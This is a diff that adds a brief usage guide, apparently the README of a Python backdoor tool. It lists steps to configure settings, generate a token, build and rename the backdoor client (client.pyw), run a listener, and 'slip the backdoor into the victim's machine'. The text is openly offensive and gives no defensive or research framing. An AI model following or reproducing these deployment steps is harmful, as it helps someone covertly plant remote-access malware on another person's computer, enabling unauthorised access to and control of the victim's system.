@@ -1,0 +1,10 @@
+
+1. Configure the settings in cfg/settings.json.
+
+2. Run generate_new_token.py, and it will generate a random token and place it in cfg/settings.json.
+
+3. Run configure.py, and it will configure the backdoor (client.pyw).
+
+4. Rename client.pyw whatever you'd like (as long as it stays a pyw file).
+
+5. Run listener.py, slip the backdoor into the victim's machine, and run it.
